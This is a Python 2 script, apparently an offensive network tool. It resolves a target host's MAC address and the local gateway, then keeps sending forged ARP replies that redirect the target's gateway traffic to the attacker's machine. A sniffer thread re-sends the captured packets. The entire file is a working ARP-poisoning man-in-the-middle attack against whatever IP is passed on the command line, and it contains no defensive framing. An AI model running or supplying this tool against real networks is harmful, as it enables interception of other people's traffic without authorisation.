import threading
import commands
import sys
import netifaces
import logging
import time
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

dev = ""
my_ip = ""
my_mac = ""
gateway_ip = ""
gateway_mac = ""
target_ip = ""

def getBash(command):
    return commands.getoutput(command)

def pkt_callback(pkt):
    global my_mac
    
    pkt.hwsrc = my_mac
    #pkt.show()
    send(pkt)

def setNetworkInfo() :
    global dev
    global my_ip
    global my_mac
    global gateway_ip
    global gateway_mac

    dev = netifaces.gateways()['default'][netifaces.AF_INET][1]
    my_ip = netifaces.ifaddresses(dev)[2][0]['addr']
    my_mac = netifaces.ifaddresses(dev)[17][0]['addr']
    gateway_ip = netifaces.gateways()[2][0][0]
    gateway_mac = getBash("arp -a | grep \"("+gateway_ip+")\" | awk -F ' ' '{print $4}'")

class enrjf_sniffer(threading.Thread):
    global dev
    global target_ip

    def run(self):
        sniff(iface=dev, prn=pkt_callback, lfilter=target_ip)
class enrjf_spoofer:
    global dev
    global my_ip
    global my_mac
    global gateway_ip
    global gateway_mac
    global target_ip
    target_ip = ""
    target_mac = ""
    gatewayARP = ""
    targetARP = ""

    def setPosion(self):
        result = getBash("arping -I "+dev+" -c 1 "+self.target_ip+" | grep 'reply from "+self.target_ip+"' | awk -F ' ' '{print $5}'")
        self.target_mac = str.lower(result[1:-1])
        target_ip = self.target_ip

    def arpPoisoning(self):
        #self.gatewayARP = Ether(dst = gateway_mac, src = self.target_mac)/ARP(op = "is-at", hwsrc = my_mac, psrc = self.target_ip)
        self.targetARP = Ether(dst = self.target_mac, src = gateway_mac)/ARP(op = "is-at", hwsrc = my_mac, psrc = gateway_ip)

        print "\nForwarding target: %s to  MAC %s"%(self.target_ip, my_mac)
        #print "Forwarding target: %s to MAC %s"%(gateway_ip, my_mac)

        #endp(self.gatewayARP, verbose = 0, inter = 1)
        sendp(self.targetARP, verbose = 0, inter = 1)
        

    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.setPosion()

if __name__=="__main__":

    global dev
    global my_ip
    global my_mac
    global gateway_ip
    global gateway_mac

    setNetworkInfo()
    sniffer = enrjf_sniffer()
    sniffer.start()
    
    spoofer = enrjf_spoofer(sys.argv[1])

    while True:
        spoofer.arpPoisoning()
        time.sleep(1)
